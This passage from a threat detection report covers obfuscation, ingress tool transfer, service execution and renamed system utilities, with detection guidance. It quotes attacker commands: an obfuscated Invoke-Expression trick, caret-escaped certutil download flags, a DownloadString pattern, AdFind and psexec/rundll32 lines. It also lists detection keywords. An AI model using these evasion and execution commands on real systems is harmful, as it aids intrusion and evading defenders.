controls\n\nSince interpolation is nuanced, we’ve included the following image of\n\ncommands used by TA551 as an illustrative example of what is described in the\n\nlast bullet above. drop.tmp is the DLL installer for the follow-on IcedID payload.\n\n###### Substrings\n\nOur next most common flavor of obfuscation involves the use of substrings. Take\n\nthe following as an example of how an adversary might leverage a substring:\n\n**$ENV:pubLic[13]+$env:PublIc[5]+’x’.**\n\nThe plus signs here are string concatenation, which we’ve addressed. Looking\n\non either side of the plus sign, we see a substring that will cause PowerShell to\n\ncombine the 14th and sixth characters (remember, the first element of an array\n\nstarts at 0) from the Public environment variable. On most systems, the public\n\nenvironmental variable will be C:\\Users\\Public. You can do the counting, but the\n\nresulting substring is ie. The + operator then adds an x on the end, resulting in an\n\nInvoke-Expression cmdlet that will execute whatever code is passed to it. If you\n\nhad robust coverage looking for the execution of PowerShell with an Invoke\nExpression in the command line, then you might miss this behavior.\n\nThe following command line used by Cobalt Strike offers a clear example of why\n\nan adversary might use a substring. Here the adversary is replacing a !, which is\n\nnot a valid member of PowerShell’s Base64 character set, with an empty string.\n\nThe result could help adversaries circumvent detection controls designed to\n\nalert on Base64 encoding.\n\n\n-----\n\n###### Escape characters\n\nSome obfuscation techniques are so focused on fooling machines that they\n\ndisproportionately draw attention. PowerShell and the Windows Command\n\nShell both have escape characters (i.e., ` or `\\`, depending on the context,\n\nand `^`, respectively) for situations where users may want to prevent special\n\ncharacters from being interpreted by the command shell or PowerShell\n\ninterpreter. Take the following string, which is copied from the string\n\nconcatenation image above:\n\n**/u^r^l^c^a^c^h^e^ /f^**\n\nExamined in context, you can see that it contains two command-line options for\n\n**certutil.exe: /urlcache and /f. The carets here are escape characters that serve**\n\nno purpose except to protect this string against potential signature matches.\n\nWe see the DOS escape character used frequently in attacks in the manner\n\nabove. PowerShell escape characters are also used, but more conservatively.\n\n[For more on this topic, take a look at the work of Daniel Bohannon, who](https://www.google.com/search?q=invoke-obfuscation+dosfuscation+bohannon)\n\nhas produced tools, whitepapers, and conference talks on the subjects of\n\nPowerShell and Windows Command Shell obfuscation.\n\n##### Detection\n\n###### Collection requirements\n\n Windows Event Logs\n\nWindows Security Event Log ID 4688 with command-line argument capture\n\nenabled is a great source of data for observing and detecting malicious use\n\n[of obfuscation. However, so too are Sysmon and endpoint detection and](https://redcanary.com/solutions/endpoint-detection-and-response/)\n\n**[response (EDR) tools, most of which will collect data that is integral to analyzing](https://redcanary.com/solutions/endpoint-detection-and-response/)**\n\nObfuscated Files or Information: process execution and command lines.\n\n###### Process and command-line monitoring\n\nObfuscation is often initiated by cmd.exe and powershell.exe commands. In\n\norder to gain visibility into the malicious use of obfuscation, you will need to\n\nmonitor for the execution of certain processes in tandem with command-line\n\nparameters. Generally, you’ll want to watch out for execution of cmd.exe and\n\n\n-----\n\n**powershell.exe with command-line parameters that are suggestive of**\n\nsuspicious obfuscation.\n\n###### Detection opportunities\n\nWhile the analysis section covered many variations of obfuscation, we’ll focus\n\nour detection suggestions on just those we observe with a degree of regularity.\n\n###### Base64\n\nDeveloping robust coverage for all the possible invocations of Base64 can be\n\nchallenging. In general, it’s better to build detections around behaviors than\n\npatterns, but there is a place for both.\n\nIf you’re looking to detect malicious use of Base64 encoding, consider\n\nmonitoring for the execution of processes like powershell.exe or cmd.exe\n\nalong with command lines containing parameters like ToBase64String and\n\n**FromBase64String.**\n\n###### Other encoding\n\nUse of the -EncodedCommand PowerShell switch represents the most common\n\nform of obfuscation that we detect across the environments we monitor.\n\nConsider alerts for the execution of powershell.exe in tandem with any variation\n\non the encoded command switch (e.g., -e, -ec, -encodedcommand, -encoded,\n\n**-enc, -en, -encod, -enco, -encodedco, -encodedc, and -en^c).**\n\n###### Escape characters\n\nConsider alerting on command lines containing excessive use of characters\n\n[associated with obfuscation, like ^, =, %, !, [, (, ;. This FireEye blog post, code,](https://www.fireeye.com/blog/threat-research/2017/07/revoke-obfuscation-powershell.html)\n\n[and whitepaper offer excellent, detailed, actionable guidance on obfuscation](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf)\n\ndetection strategies.\n\n###### Weeding out false positives\n\nSeeing as how this method is used by adversaries and administrative tasks\n\nalike, obfuscated files are prone to false positives. The best way to prevent false\n\npositive alerts on this type of behavior is to not depend on it as a sole indicator\n\nof malicious activity. Organizations should explore enabling PowerShell logging\n\nand execution policy restrictions set via GPO, which can’t be overridden at\n\nthe command line, and enable enforcement of signed script execution and\n\nconstrained runspaces.\n\n\n###### T 1 0 2 7 : O B F U S C AT E D F I L E S O R I N F O R M AT I O N\n\n“Adversaries may attempt to make an\n\nexecutable or file difficult to discover\n\nor analyze by encrypting, encoding, or\n\notherwise obfuscating its contents on\n\nthe system or in transit. This is common\n\nbehavior that can be used across\n\ndifferent platforms and the network to\n\nevade defenses.”\n\n\n-----\n\nDecoding the obfuscated information to determine its use and analyzing\n\nsurrounding activities and behaviors will also reduce the false positive rate. Ask\n\nyourself:\n\n- What is the parent process? Is it a trusted source or common in\n\nthe environment?\n\n- What child processes exist? Is the behavior they perform expected\n\nor non-threatening?\n\n- What sibling-processes are present? Are they benign in nature?\n\n\n**D E T EC T I O N**\n**E N G I N E E R**\n**T E A M M A N A G E R**\n\nAndy has been in IT for 14 years. He\n\nbegan on the help desk, grew into\n\nsystem administration, and eventually\n\nlanded in information security. He cut\n\nhis teeth on antivirus architecture and\n\nadministration while also taking part\n\nin vulnerability management, firewall\n\nsecurity, and Splunk administration.\n\nAndy joined Red Canary as a malware\n\nanalyst, and now heads up operational\n\nmanagement of the detection\n\nengineering team. Outside of work,\n\nAndy loves mountain biking, hiking,\n\ncamping, swimming, and is an\n\namateur photographer.\n\n###### James Young\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nJames has more than a decade of\n\nexperience in cyber threat analysis\n\nfocusing on the financial and business\n\nsectors. He’s passionate about sharing\n\nknowledge and hunting down malware.\n\nJames is exploring his passions on\n\nRed Canary’s Customer Security\n\nOperations team. When he’s not hunting\n\nthreats, he’s hunting for powder on his\n\nsnowboard in the mountains.\n\n\n-----\n\n###### T E C H N I Q U E T 1 1 0 5\n\n##### Ingress Tool Transfer\n\nWhile living off the land is incredibly popular, adversaries still frequently need to\nintroduce their own external tools in order to accomplish their objectives—and\nthey’re constantly finding novel and deceptive ways to do so.\n\n##### Analysis\n\n###### Why do adversaries use Ingress  Tool Transfer?\n\nUpon gaining access to a system, adversaries need to perform post-exploitation\n\nactions to achieve their objectives. While victim operating systems offer an\n\nabundance of built-in functionality, adversaries frequently rely on their own\n\ntools to continue compromising an endpoint and network after initial entry.\n\nIngress Tool Transfer is a technique adversaries leverage to bring their own tools\n\ninto a compromised network.\n\n###### How do adversaries use Ingress  Tool Transfer?\n\nThere are many native system binaries that enable adversaries to make external\n\nnetwork connections and download executables and scripts; many native\n\nprocesses allow for these files to get executed in memory without the file being\n\nwritten to disk. No matter the method used, an adversary must be able to\n\ndownload files to successfully perform Ingress Tool Transfer.\n\nWe commonly observe Ingress Tool Transfer in tandem with other techniques.\n\nThis is due in part to how ATT&CK is structured—Ingress Tool Transfer falls under\n\n[the Command and Control (C2) tactic, but in order for it to be performed, it](https://attack.mitre.org/tactics/TA0011/)\n\n[typically requires some type of Execution (a different tactic) to occur as well.](https://attack.mitre.org/tactics/TA0002/)\n\nHistorically, adversaries have relied on vulnerabilities found in processes that\n\nwould allow them to perform remote code execution. However, in 2020, we\n\nobserved adversaries performing Ingress Tool Transfer with system binaries\n\n(often referred to as living-off-the-land binaries, or LOLBINs)— commonly\n\n\n###### OVERALL RANK\n\n#### 27.6%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 1,149\n\n###### CONFIRMED THREATS\n\n\n-----\n\nBITSadmin, Certutil, Curl, Wget, Regsvr32, and Mshta. The most common\n\nexecution technique we observed adversaries using in tandem with Ingress Tool\n\nTransfer was our most prevalent technique in general: PowerShell. For example,\n\n**[Smominru malware (also known as “MyKings”) uses the PowerShell command](https://www.proofpoint.com/us/threat-insight/post/smominru-monero-mining-botnet-making-millions-operators)**\n\n**iex(New-Object Net.WebClient).DownloadString to download additional files,**\n\nas seen below:\n\nWe observed this same Ingress Tool Transfer + PowerShell combination in many\n\nother threats in 2020, including our ninth most prevalent threat, TrickBot.\n\n###### Emerging Ingress Tool  Transfer tradecraft\n\nAdversaries are constantly coming up with novel ways to perform Ingress Tool\n\nTransfer that are harder for defenders to identify and detect. We are seeing\n\nadversaries leveraging macros and VBA code to make system calls directly (such\n\n[as the HttpOpenRequestA function) to download their tools. The Lazarus](https://web.archive.org/web/20190625182633if_/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/)\n\nGroup also uses methods within the libcurl library instead of calling curl to\n\n[perform Ingress Tool Transfer. Behaviors such as these disguise Ingress Tool](https://objective-see.com/blog/blog_0x53.html)\n\nTransfer within the process, making it more challenging to identify as malicious.\n\nIn a similar vein, adversaries have started weaponizing RTF files to inject\n\n[shellcode into Microsoft’s Equation Editor to download their tools, leveraging](https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/)\n\n[lesser known LOLBINs that have the ability to download from the internet (such](https://twitter.com/mohammadaskar2/status/1301263551638761477)\n\n**[as the bug in Windows Defender discovered and fixed late last year).](https://twitter.com/mohammadaskar2/status/1301263551638761477)**\n\nOn the network side, many monitoring and prevention tools can identify and\n\nblock executable and script files from being transferred into the network. In an\n\neffort to evade these defenses, adversaries have combined Ingress Tool Transfer\n\n[with Masquerading, hiding their tool within JPEG files that many network](https://web.archive.org/web/20190625182633if_/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/)\n\nmonitoring tools allow to pass through into the network.\n\n\n-----\n\n##### Detection\n\n###### Collection requirements\n\n Command-line monitoring\n\nData sources that show process execution and command-line arguments (EDR\n\ntools, Sysmon, Windows Event Logs) are likely your best source of observing\n\nand detecting malicious use of Ingress Tool Transfer. These tools will allow\n\nyou to look for a download or transfer taking place, as well as provide leads for\n\nfurther investigation. Using command-line arguments, you can examine remote\n\nsystems and content used to facilitate the transfer. For example, PowerShell\n\nand curl command lines often include URLs used to host remote content for\n\ndownload and execution. This data point provides an interesting pivot at which\n\nto proceed during investigations.\n\n###### Process monitoring\n\n**[EDR tools and other data sources that show process telemetry can also be](https://redcanary.com/resources/guides/endpoint-detection-response-buyers-guide/)**\n\nuseful in identifying malicious use. As a rule, more data is usually better than\n\nless. In ideal scenarios, we recommend process monitoring tools that provide\n\nprocess name, command-line arguments, file modifications, DLL module loads,\n\nand network connections. The sum of this telemetry helps paint a picture of\n\nwhat capabilities exist inside unknown processes or scripts.\n\n###### Network connections\n\nTelemetry showing network connections is often essential during investigations.\n\nWhile network connections on their own aren’t suspicious, combining network\n\nconnection data with the known and expected behaviors of processes can yield\n\nbreathtaking results. In addition, correlating network connections with other\n\ndata points—such as file modifications or time of day—can help suspicious\n\nactivity stand out from the crowd. A good example of this correlation would\n\nbe certutil.exe making network connections. On its own, the utility doesn’t\n\ntypically make connections, but it may make file modifications. If a network\n\nconnection occurs from certutil.exe alongside the file modifications, you can\n\nmore reasonably assess that certutil.exe enabled Ingress Tool Transfer.\n\n###### Packet capture\n\nFinally, web filters, firewalls, and Intrusion Prevention Systems (IPS) that are\n\ncapable of performing deep content inspection can be useful for identifying\n\nexecutables and DLLs being transferred into the network. Despite adversaries’\n\n\n###### T 1 1 0 5 : I N G R E S S T O O L T R A N S F E R\n\n“Adversaries may transfer tools or other\n\nfiles from an external system into a\n\ncompromised environment. Files may\n\nbe copied from an external adversary\n\ncontrolled system through the\n\ncommand and control channel to bring\n\ntools into the victim network or through\n\nalternate protocols with another tool\n\nsuch as FTP. Files can also be copied\n\nover on Mac and Linux with native tools\n\nlike scp, rsync, and sftp.”\n\n\n-----\n\nattempts at obfuscation, well constructed security architecture can enable\n\ndefenders to spot useful patterns in traffic ingressing to the network from\n\nadversary-controlled systems. Good examples of these patterns include MZ\n\nheaders in executable content and portions of script content. This sort of data\n\nenables defenders to also use additional types of analytics or rules, such as\n\nthose for Snort or Suricata detections. By supplementing endpoint detection\n\ncapabilities with network data, your security team can become a relentless\n\ndefensive force.\n\n###### Detection opportunities\n\n Suspicious commands\n\nBy far the most fruitful method by which we have identified malicious Ingress\n\nTool Transfer use is examining PowerShell command lines for keywords and\n\ncertain patterns.\n\nLook for the execution of powershell.exe with command lines containing the\n\nfollowing keywords:\n\n**•** **downloadstring**\n\n**•** **downloaddata**\n\n**•** **downloadfile to a temporary/non standard location (temp or appdata) or in**\n\ncombination with execution (invoke-expression)\n\nYou should also consider alerting on certain patterns in PowerShell command\n\nlines, like bitsadmin.exe with download in the command line or certutil using\n\n**urlcache or with split in the command line.**\n\nAnother suspicious command pattern that warrants monitoring is curl or wget\n\nmaking an external network connection immediately followed by writing or\n\nmodifying an executable file, particularly to a temp location.\n\nOther LOLBINs such as mshta.exe, csc.exe, msbuild.exe, or regsvr32.exe\n\nmaking external network connections to URLs ending with an executable\n\nor image extension, suspicious domains, and/or unusual IP addresses are\n\ninherently suspicious and warrant monitoring.\n\n###### Weeding out false positives\n\nThe majority of the telemetry patterns above can also manifest in development\n\npipelines and systems management tools. Given this, and as is the case for many\n\ndetection ideas in this report, you may want to do an environment audit and\n\nfigure out if these potentially suspicious behaviors are being employed by any\n\nlegitimate tools or people in your environment.\n\n\n-----\n\nOnce you understand legitimate use cases, you can tune those out as exceptions\n\nand focus your detection efforts on seeking out behaviors that are more likely to\n\nrepresent malicious instances of Ingress Tool Transfer.\n\n\n**I N C I D E N T**\n**H A N D L E R**\n\nAs an incident handler, Adina works\n\nalongside security and IT teams\n\nadvising on ways to improve their\n\nsecurity posture and eradicate cyber\n\nthreats. Previously her work included\n\ninvestigating threats, building\n\nautomated response plans, and\n\nimproving security policies. She enjoys\n\nsolving puzzles, breaking down complex\n\nideas, and educating others on the\n\nimportance of cyber safety.\n\n###### Zack Fink\n\n**I N C I D E N T**\n**H A N D L E R**\n\nZack is an Incident Handler at Red\n\nCanary. His IT and security experience\n\nranges from small businesses to Fortune\n\n50 organizations. When not in front of\n\na keyboard, he’s often found trudging\n\nthrough the frozen tundra of the Upper\n\nMidwest, occasionally on horseback.\n\n\n-----\n\n###### T E C H N I Q U E T 1 5 6 9\n\n##### System Services\n\nSystem Services ranks ninth this year thanks almost entirely to detections\n\n\n###### OVERALL RANK\n\n#### 20.3%\n\n\nassociated with its Service Execution sub-technique.\n\n\n**T 1 5 6 9 . 0 0 2**\n\n###### Service Execution\n\n\n###### 19.2% 892\nORGANIZATIONS AFFECTED CONFIRMED THREATS\n\nAdversaries use the Windows Service Manager to run commands or\ninstall or manipulate services, often with elevated privilege levels.\n\n\n###### ORGANIZATIONS AFFECTED\n\n#### 909\n\n\n**S E E M O R E  >**\n\n\n###### CONFIRMED THREATS\n\n\n###### T 1 5 6 9 : S Y S T E M S E R V I C E S\n\n“Adversaries may abuse system services or daemons to execute commands or\n\n\nprograms. Adversaries can execute malicious content by interacting with or creating\n\nservices. Many services are set to run at boot, which can aid in achieving persistence\n\n(Create or Modify System Process), but adversaries can also abuse services for one\n\ntime or temporary execution.”\n\n\n-----\n\n###### T E C H N I Q U E T 1 5 6 9 . 0 0 2\n\n##### Service Execution\n\nAdversaries use the Windows Service Manager to run commands or install or\nmanipulate services, often with elevated privilege levels.\n\n##### Analysis\n\n###### Why do adversaries use  Service Execution?\n\nAll production operating systems have one thing in common: a mechanism to\n\nrun a program or service continuously. On Windows, such a program is referred\n\nto as a “service,” and in the Unix/Linux world, such a program is often referred to\n\nas a “daemon.” Regardless of what operating system you’re using, being able to\n\ninstall a program so it runs whenever the computer is on has an obvious appeal\n\nto adversaries.\n\nIn addition to ensuring the program starts after a reboot, this technique usually\n\nruns the program with a high privilege level, a win-win for adversaries.\n\n###### How do adversaries use  Service Execution?\n\nIn the Windows world, adversaries may use the Windows Service Manager\n\n(services.exe), sc.exe, or the net.exe commands to install or manipulate\n\nservices. We often see the manipulation of registry entries with the\n\n**regsvr32.exe program. These attempts to install or modify a service are**\n\nassociated with T1543.003: Windows Service. While installation or modification\n\n[of services is closely related to the subsequent execution of a service, MITRE](https://redcanary.com/mitre-attack/)\n\n[ATT&CK classifies execution as a distinct sub-technique. The rationale for](https://redcanary.com/mitre-attack/)\n\nthis distinction offers an opportunity to highlight detection domains that are\n\nseparate and not necessarily dependent upon one another.\n\nWhen beginning to think about detection opportunities for Service Execution,\n\nit’s helpful to understand that all Windows services spawn as child processes\n\nof services.exe (kernel drivers being the exception). It’s also useful to know\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 19.2%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 892\n\n###### CONFIRMED THREATS\n\n\n-----\n\n[that distinct service types have different models of execution. For example,](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea#parameters)\n\na SERVICE_USER_OWN_PROCESS service comprises a standalone service\n\nexecutable (EXE), whereas a SERVICE_WIN32_SHARE_PROCESS service\n\ncomprises a service DLL that’s loaded into a shared svchost.exe process.\n\nAdditionally, device drivers are traditionally loaded via a SERVICE_KERNEL_\n\n**DRIVER service type.**\n\nDetection engineers who are familiar with distinct service types are better\n\nequipped to scope their detection logic according to the execution options\n\navailable to an adversary. For example, an adversary might consider executing\n\ntheir malicious service as a SERVICE_WIN32_SHARE_PROCESS service DLL\n\nrather than a standalone binary to stay evasive in cases when DLL loads are\n\nlikely scrutinized less than standalone EXE process starts. An adversary of\n\nsufficient ability may also decide to execute under the context of a device driver,\n\ntaking into consideration operational needs and perhaps a defender’s inability\n\nto discern a legitimate driver from a suspicious one.\n\n##### Detection\n\n###### Collection requirements\n\n Process and command line monitoring\n\nBecause adversaries often manipulate Windows services via built-in system\n\ntools, telemetry drawn from process monitoring and command-line parameters\n\n[can be useful for detecting malicious service use. Sources include EDR tools,](https://redcanary.com/solutions/endpoint-detection-and-response/)\n\nSysmon, or native command-line logging.\n\n###### DLL load monitoring\n\nIt may be helpful to monitor for DLL loads in order to identify when a service DLL\n\n[loads in the context of a shared svchost.exe process. Sysmon Event ID 7 is one](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90007)\n\navailable data source for gaining visibility into DLL loads.\n\n###### Device driver load monitoring\n\nAs we noted above, adept adversaries may choose to execute services in the\n\ncontext of a device driver, so it’s important to monitor device driver loads.\n\n**[Windows Defender Application Control (WDAC) can be an effective source of](https://posts.specterops.io/threat-detection-using-windows-defender-application-control-device-guard-in-audit-mode-602b48cd1c11)**\n\ndevice driver monitoring.\n\n\n###### T 1 5 6 9 . 0 0 2 :  S E R V I C E E X E C U T I O N\n\n“Adversaries may abuse the Windows\n\nservice control manager to execute\n\nmalicious commands or payloads.\n\nThe Windows service control manager\n\n(services.exe) is an interface to manage\n\nand manipulate services. The service\n\ncontrol manager is accessible to users\n\nvia GUI components as well as system\n\nutilities such as sc.exe and Net.”\n\n\n-----\n\n###### Unix/Linux systems\n\nIn addition to monitoring command-line signals, alerting on changes to the\n\nconfiguration files for daemons—and/or their startup scripts—is a powerful tool\n\nfor detecting this tactic. This includes monitoring for the creation of new files in\n\nthe /etc/rc directory trees.\n\nFor macOS, pay special attention to the use of launchctl and manipulation of\n\nfiles in the Library/LaunchAgents and Library/LaunchDeamon directories,\n\nalthough this leads into a grey area that might fall under the purview of\n\n**[T1569.001 System Services: Launchctl.](https://attack.mitre.org/techniques/T1569/001/)**\n\n###### Detection opportunities\n\nMalicious service execution often incorporates normally benign tools, so it\n\nmakes sense to focus detection efforts around the use of legitimate tools under\n\nunusual circumstances. For example, alert when a normal utility is invoked from\n\nnon-standard or untrusted parent processes, or with unexpected command-line\n\narguments. You should also watch for services that spawn interactive shells or\n\nthat run a program from non-system directories.\n\nOne useful analytic that we’ve used to detect service execution involves looking\n\nfor instances of the Windows Command Processor (cmd.exe) spawning from\n\nthe Service Control Manager (services.exe), which adversaries use to execute\n\ncommands as the local SYSTEM account. Looking for /c in the command line\n\nmay help narrow in on potential interactive sessions. The /c switch carries out\n\nthe command specified by string and then terminates. Building detector logic\n\naccounting for this switch has the potential to cast a wider net for catching\n\ninteractive commands without regard for the respective filename of cmd.exe.\n\n###### Weeding out false positives\n\nFalse positives most often involve new programs in which the installation\n\nscript takes some liberties with how it installs or upgrades software. Games\n\nare frequent offenders in this respect. Approaches for filtering on legitimate\n\nprograms could include excluding specific “known good” hashes from detection\n\nanalytics. Depending on the environment, it may make sense to take a broader\n\napproach of excluding .bat scripts altogether, especially if their inclusion causes\n\ntoo much noise.\n\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nDel has an extensive history working\n\nin IT, including 15 years focused on\n\ncomputer security. He has a master’s\n\nin computer science and expertise in\n\nLinux/Unix, SOC team training, and\n\nvarious programming languages.\n\nDel lives for the technical side of this\n\nbusiness and loves to explore new\n\nways to solve security challenges while\n\nmentoring others.\n\n###### Jim Irwin\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nJim Irwin is a manager on the Detection\n\nEngineering team. Prior to joining\n\nRed Canary, he served on active duty\n\nand still serves in the Reserves as an\n\nintelligence officer. Jim has worked\n\nboth the offensive and defensive side for\n\nthe U.S. Army, as a Red Team Lead and\n\nNetwork Defense Watch Officer.\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 3 6\n\n##### Masquerading\n\nMasquerading ranks tenth this year thanks in large part to detections associated\n\n\n###### OVERALL RANK\n\n#### 31.2%\n\n\nwith its Rename System Utilities sub-technique.\n\n\n**T 1 0 3 6 . 0 0 3**\n\n###### Rename System Utilities\n\n\n###### 23.1% 624\nORGANIZATIONS AFFECTED CONFIRMED THREATS\n\nA behavior that’s inherently suspicious in the context of one\nprocess can be completely normal in the context of another, which\nis precisely why adversaries rename system utilities to throw\ndefenders off.\n\n\n###### ORGANIZATIONS AFFECTED\n\n#### 906\n\n\n###### CONFIRMED THREATS\n\n\n**S E E M O R E  >**\n\n\n###### T 1 0 3 6 : M A S Q U E R A D I N G\n\n“Adversaries may attempt to manipulate features of their artifacts to make them\n\n\nappear legitimate or benign to users and/or security tools. Masquerading occurs when\n\nthe name or location of an object, legitimate or malicious, is manipulated or abused\n\nfor the sake of evading defenses and observation. This may include manipulating file\n\n\nmetadata, tricking users into misidentifying the file type, and giving legitimate task or\n\nservice names.”\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 3 6 . 0 0 3\n\n##### Rename System Utilities\n\nA behavior that’s inherently suspicious in the context of one process can be\ncompletely normal in the context of another, which is precisely why adversaries\nrename system utilities to throw defenders off.\n\n##### Analysis\n\n###### Why do adversaries use Rename  System Utilities?\n\nAdversaries rename system utilities to circumvent security controls and bypass\n\ndetection logic dependent on process names and process paths. Renaming\n\nor moving system utilities allows an adversary to take advantage of tools that\n\nalready exist on the target system and prevents them from having to deploy as\n\nmany additional payloads after initially gaining access.\n\nRenaming a system utility allows the adversary to use a legitimate binary in\n\nmalicious ways—while adding layers of confusion to the analytical process. For\n\nexample, a behavior might be inherently suspicious in the context of one process\n\nname but completely normal in the context of another. Therefore, adversaries\n\nwould seek to cloak their suspicious behaviors inside the context of a non\nsuspect process name.\n\nFrom a very high level, detection or prevention of renamed system utilities\n\nrequires two things: you must be able to observe suspicious behaviors\n\nindependent of their origin and you must be able to recognize the true identity\n\nof any given system utility.\n\n###### How do adversaries use Rename  System Utilities?\n\nAdversaries either rename system binaries, relocate them, or perform some\n\ncombination of renaming and relocation. Employment of this technique often\n\nfollows a similar pattern: an initial payload (e.g., a malicious script or document)\n\ncopies or writes a renamed or relocated system binary, which is then used to\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 23.1%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 624\n\n###### CONFIRMED THREATS\n\n\n-----\n\nexecute additional payloads and/or establish persistence.\n\n[In 2020, we observed adversaries renaming AdFind, an open source tool](https://www.joeware.net/freetools/tools/adfind/index.htm)\n\n[that extracts information from Active Directory. Microsoft reported that the](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n\nadversaries behind Solorigate used a renamed version of AdFind for domain\n\nenumeration. The following example provided by Microsoft shows AdFind\n\nrenamed as csrss.exe in an apparent attempt to masquerade as the Client\n\nServer Runtime Subsystem process, as this command identifies domain\n\nadministrators. Interestingly, this example shows “double masquerading”—\n\nboth renaming the utility as well as choosing a name that mimics a different\n\nlegitimate process.\n\n```\nC:\\Windows\\system32\\cmd.exe /C csrss.exe -h\nbreached.contoso[.]com -f (name=”Domain Admins”)\nmember -list | csrss.exe -h breached.contoso[.]\ncom -f objectcategory=* > .\\Mod\\mod1.log\n\n```\n\n[As we recommend in our Bazar blog post, looking for any use of adfind.exe may](https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/)\n\nhelp you find adversaries in your environment. If that’s too noisy, looking for a\n\nrenamed adfind.exe file can be a useful detection strategy to identify threats.\n\nThe operators of Egregor ransomware also used this technique in 2020, with a\n\ndifferent system utility. These operators renamed psexec.exe as pse.exe and\n\nused it to redirect rundll32.exe to load a malicious DLL file (b.dll in the\n\nbelow example):\n\n\n###### T 1 0 3 6 . 0 0 3 : R E N A M E S Y S T E M U T I L I T I E S\n\n“Adversaries may rename legitimate\n\nsystem utilities to try to evade security\n\nmechanisms concerning the usage of\n\nthose utilities. Security monitoring and\n\ncontrol mechanisms may be in place for\n\nsystem utilities adversaries are capable\n\nof abusing. It may be possible to bypass\n\nthose security mechanisms by renaming\n\nthe utility prior to utilization (ex:\n\nrename rundll32.exe). An alternative\n\ncase occurs when a legitimate utility is\n\ncopied or moved to a different directory\n\nand renamed to avoid detections based\n\non system utilities executing from non\nstandard paths.”\n\n```\n“C:\\WINDOWS\\pse.exe” -n 5 \\\\[redacted].0.0.0 -s\nrundll32.exe C:\\WINDOWS\\b.dll,DllRegisterServer\n-passegregor[####]\n\n```\n\n-----\n\n##### Detection\n\n###### Collection requirements\n\n Process metadata\n\nThird-party tooling or native logging features that offer access to process\n\nmetadata (e.g., process names, internal names, known paths, etc.) are\n\namong the most effective data sources for observing or identifying renamed\n\nsystem utilities.\n\nMost of our confirmed threat detections relating to renamed system utilities\n\ninvolve adversaries renaming known system binaries. Perhaps the most\n\neffective method for finding renamed system utilities is to compare the name\n\nembedded directly into the binary file (i.e., its internal name) with its externally\n\npresented name and generate alerts whenever those two names are different\n\nor deviate from what is expected. You can also compare expected process paths\n\nto the actual process paths—basing expected paths on what is normal for the\n\nbinary given its internal name—to detect relocated system binaries that have\n\nnot been renamed.\n\n###### Detection opportunites\n\nOur detection guidance for finding renamed system utilities can be categorized\n\ninto four basic control groups that reliably offer insight into the true identity\n\nof a binary: known process names, paths, hash values, and command-line\n\nparameters. To detect deviations from what is known or expected, consider the\n\nfollowing.\n\n**For known process names: Consider alerting on any activity where the process**\n\nname does not match a list of known process names given an internal name. As\n\nan example, the internal name for powershell.exe is PowerShell, and its known\n\nprocess names include powershell.exe, powershell, posh.exe, and posh.\n\n**For known process paths: Consider alerting on any activity where a process**\n\npath does not match a list of known process paths given an internal name. As an\n\nexample: the known expected process path associated with cscript.exe (based\n\non its internal name) should be system32, syswow64, and winsxs.\n\n**For known hash values: While process names may change, the hash value**\n\nassociated with them should not. Therefore, if you have a list of matching hash\n\nvalues in an environment, consider alerting on or examining any that have\n\n\n-----\n\na different process name. Since adversaries typically copy binaries that are\n\nalready on disk, a renamed system utility should have the same hash as the\n\noriginal. You can find these deviations by investigating the suspect hash and\n\nreviewing observed paths.\n\n**For known command-line parameters for system processes: Consider**\n\ndetecting any apparent processes executing in conjunction with command\nline parameters that are generally associated with a different process. As an\n\nexample, Invoke-Expressions (iex) are associated with PowerShell, so it would\n\nbe highly suspicious to see an invoke expression in a command line associated\n\nwith a process that appears to be something other than PowerShell.\n\n###### Weeding out false positives\n\nLooking for process names (e.g., rundll32.exe) outside of expected paths will\n\ngenerate false positives because many software developers bundle specific\n\nversions of a system process. For example, we often run into false positives on\n\n**rundll32’s unexpected paths for certain antivirus software. Identify any tools**\n\nthat exhibit this behavior and add them as exclusions to your toolset.\n\n\n###### Brian Donohue\n\n**S R . I N F O R M AT I O N**\n**S E C U R I T Y S P E C I A L I S T**\n\nBrian has been writing about and\n\nresearching information security for\n\nthe last decade. He started his career\n\nas a journalist covering security and\n\nprivacy. He later consulted as a threat\n\nintelligence analyst, researching\n\nadversaries and techniques for a\n\nvariety of major banks, retailers, and\n\nmanufacturers. At Red Canary, Brian\n\nhelps guide research publication and\n\ntechnical messaging efforts.\n\n\n-----\n\n##### Top Threats\n\nThe following chart illustrates the specific threats we detected most frequently\nacross our customers in 2020. In order to combat the skewing effects of a major\nmalware outbreak in a single environment, we ranked these threats by number\nof customer organizations affected.\n\n\n###### TA551\n\n Cobalt Strike\n\n Qbot\n\n IcedID\n\n Mimikatz\n\n Shlayer\n\n Dridex\n\n Emotet\n\n TrickBot\n\n Gamarue\n\n\n###### 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n 7\n\n 8\n\n 9\n\n 10\n\n\n###### 15.5% of customers affected\n\n\n###### 11.6%\n\n\n###### 8.7%\n\n\n###### 7.8%\n\n\n###### 6.2%\n\n\n###### 6%\n\n\n###### 5.8%\n\n\n###### 5.8%\n\n\n###### 5.1%\n\n\n###### 5%\n\n\n-----\n\n###### T H R E AT\n\n##### TA551\n\nTA551, also known as Shathak, is a threat group that uses large-scale phishing\ncampaigns to deliver additional malware payloads. IcedID and Valak were the\npredominant payloads we observed with TA551 phishing campaigns in 2020.\n\n##### Analysis\n\nTA551 was the most prevalent threat Red Canary encountered in 2020 by a 